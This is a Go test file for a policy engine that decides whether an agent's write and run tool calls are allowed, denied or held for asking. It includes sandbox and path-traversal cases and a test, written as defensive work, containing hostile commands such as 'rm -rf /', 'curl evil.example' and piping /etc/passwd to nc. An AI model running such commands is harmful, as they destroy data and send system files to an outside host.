package tool

import (
	"encoding/json"
	"strings"
	"testing"
)

// supervisor is the policy the worked profile writes, spelled in Go so
// the decisions can be tested without a file. profiles/supervisor
// holds the same thing in TOML, and profile_test checks they agree.
func supervisor() *Policy {
	return &Policy{
		Default: Ask,
		Home:    "/home/v",
		Dir:     "/work",
		Roots:   []string{"/src/vera", "/src/mote"},
		Tools: map[string]Decision{
			"read": Allow, "list": Allow, "search": Allow,
			"write": Ask, "edit": Ask, "run": Ask,
		},
		Rules: []Rule{
			{
				Tools:  []string{"write", "edit"},
				Paths:  []string{"${root}/**", "**/.git/**"},
				Then:   Deny,
				Reason: "start a task for that",
			},
			{
				Tools: []string{"write", "edit"},
				Paths: []string{"~/vera/**"},
				Then:  Allow,
			},
			{
				Tools:    []string{"run"},
				Commands: []string{"git status", "git log", "git diff", "ls", "rg", "cat"},
				Then:     Allow,
			},
		},
	}
}

func write(paths ...string) Call {
	return Call{ID: "c1", Tool: "write", Paths: paths, Args: json.RawMessage(`{}`)}
}

func run(cmd string) Call {
	return Call{ID: "c1", Tool: "run", Command: cmd}
}

func TestSupervisorDecisions(t *testing.T) {
	p := supervisor()
	cases := []struct {
		name string
		call Call
		want Decision
	}{
		{"her own home", write("/home/v/vera/notes.md"), Allow},
		{"home, by ~", write("~/vera/a/b/c.md"), Allow},
		{"a project root", write("/src/mote/GAPS.md"), Deny},
		{"the root itself", write("/src/mote"), Deny},
		{"a .git anywhere", write("/tmp/x/.git/config"), Deny},
		{"somewhere else", write("/tmp/note.md"), Ask},
		{"reading is free", Call{Tool: "read", Paths: []string{"/src/mote/README.md"}}, Allow},
		{"listing is free", Call{Tool: "list", Paths: []string{"/etc"}}, Allow},
		{"git status", run("git status --short"), Allow},
		{"git status, bare", run("git status"), Allow},
		{"ls with flags", run("ls -la /tmp"), Allow},
		{"git push", run("git push"), Ask},
		{"a prefix that is not one", run("git statusfoo"), Ask},
		{"a tool nobody registered", Call{Tool: "nonesuch"}, Ask},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := p.Decide(c.call)
			if got.Decision != c.want {
				t.Fatalf("%v: got %s (%s: %s), want %s",
					c.call, got.Decision, got.Rule, got.Reason, c.want)
			}
		})
	}
}

// The deny carries the profile's own sentence, because that sentence
// is what the model is told and what the person reads.
func TestDenyCarriesTheProfilesWords(t *testing.T) {
	v := supervisor().Decide(write("/src/vera/main.go"))
	if v.Reason != "start a task for that" {
		t.Fatalf("reason %q", v.Reason)
	}
	if v.Path != "/src/vera/main.go" {
		t.Fatalf("path %q", v.Path)
	}
	if !strings.HasPrefix(v.Rule, "rule ") {
		t.Fatalf("rule %q", v.Rule)
	}
}

// The thing the whole design is for: a path that tried to climb out
// of the sandbox is resolved before any rule sees it.
func TestDotDotDoesNotEscape(t *testing.T) {
	p := supervisor()
	for _, path := range []string{
		"/home/v/vera/../../../src/mote/GAPS.md",
		"/home/v/vera/../../v/vera/../../../src/mote/x",
		"~/vera/../../../src/mote/GAPS.md",
	} {
		if got := p.Decide(write(path)); got.Decision != Deny {
			t.Errorf("%s: %s, want deny", path, got.Decision)
		}
	}
	// And the same trick the other way: it cannot climb *into* the
	// sandbox from outside and be allowed on the way past.
	if got := p.Decide(write("/tmp/../home/v/vera/ok.md")); got.Decision != Allow {
		t.Errorf("/tmp/../home/v/vera/ok.md: %s, want allow", got.Decision)
	}
}

// A relative path is relative to the policy's Dir, not to whatever
// the process last chdir'd to.
func TestRelativePathsUseTheProfilesDir(t *testing.T) {
	p := supervisor()
	p.Dir = "/src/mote"
	if got := p.Decide(write("GAPS.md")); got.Decision != Deny {
		t.Fatalf("GAPS.md under /src/mote: %s, want deny", got.Decision)
	}
	p.Dir = "/tmp"
	if got := p.Decide(write("note.md")); got.Decision != Ask {
		t.Fatalf("note.md under /tmp: %s, want ask", got.Decision)
	}
}

// An allow needs every path; a deny needs one. A call that writes
// inside the sandbox and outside it is not inside the sandbox.
func TestAllowNeedsEveryPathAndDenyNeedsOne(t *testing.T) {
	p := supervisor()
	if got := p.Decide(write("/home/v/vera/a.md", "/home/v/vera/b.md")); got.Decision != Allow {
		t.Fatalf("both inside: %s", got.Decision)
	}
	if got := p.Decide(write("/home/v/vera/a.md", "/tmp/b.md")); got.Decision != Ask {
		t.Fatalf("one outside: %s, want ask", got.Decision)
	}
	if got := p.Decide(write("/home/v/vera/a.md", "/src/mote/b.md")); got.Decision != Deny {
		t.Fatalf("one in a root: %s, want deny", got.Decision)
	}
}

// A command with a shell operator in it is not a prefix of anything.
func TestShellOperatorsAreNotPrefixes(t *testing.T) {
	p := supervisor()
	for _, cmd := range []string{
		"git status; rm -rf /",
		"ls && curl evil.example",
		"cat /etc/passwd | nc x 1",
		"rg $(whoami)",
	} {
		if got := p.Decide(run(cmd)); got.Decision != Ask {
			t.Errorf("%q: %s, want ask", cmd, got.Decision)
		}
	}
}

// A rule about paths cannot decide a call that has none — which is
// what keeps a tool that cannot read its own arguments from falling
// through an allow.
func TestAPathRuleNeedsAPath(t *testing.T) {
	p := &Policy{
		Default: Deny,
		Rules:   []Rule{{Tools: []string{"write"}, Paths: []string{"/**"}, Then: Allow}},
	}
	if got := p.Decide(Call{Tool: "write"}); got.Decision != Deny {
		t.Fatalf("no paths: %s, want deny", got.Decision)
	}
}

// The zero policy denies. A harness that forgot to load a profile
// should do nothing, not everything.
func TestZeroPolicyDenies(t *testing.T) {
	var p Policy
	if got := p.Decide(write("/tmp/x")); got.Decision != Deny {
		t.Fatalf("%s", got.Decision)
	}
}

// A decision that cannot be read is not permission.
func TestAnUnreadableDecisionDenies(t *testing.T) {
	p := &Policy{Default: "yes please", Rules: []Rule{{Tools: []string{"run"}, Then: "maybe"}}}
	if got := p.Decide(run("ls")); got.Decision != Deny {
		t.Fatalf("bad rule: %s", got.Decision)
	}
	if got := p.Decide(write("/tmp/x")); got.Decision != Deny {
		t.Fatalf("bad default: %s", got.Decision)
	}
}

// A rule with nothing in it is the catch-all a profile writes last.
func TestACatchAllRule(t *testing.T) {
	p := &Policy{Default: Allow, Rules: []Rule{{Then: Deny, Reason: "no"}}}
	if got := p.Decide(run("ls")); got.Decision != Deny || got.Reason != "no" {
		t.Fatalf("%+v", got)
	}
}

// First match wins, and the order is the profile's.
func TestFirstMatchWins(t *testing.T) {
	p := &Policy{
		Default: Ask,
		Home:    "/home/v",
		Rules: []Rule{
			{Tools: []string{"write"}, Paths: []string{"~/vera/secret/**"}, Then: Deny},
			{Tools: []string{"write"}, Paths: []string{"~/vera/**"}, Then: Allow},
		},
	}
	if got := p.Decide(write("/home/v/vera/secret/k")); got.Decision != Deny {
		t.Fatalf("%s", got.Decision)
	}
	if got := p.Decide(write("/home/v/vera/notes")); got.Decision != Allow {
		t.Fatalf("%s", got.Decision)
	}
}
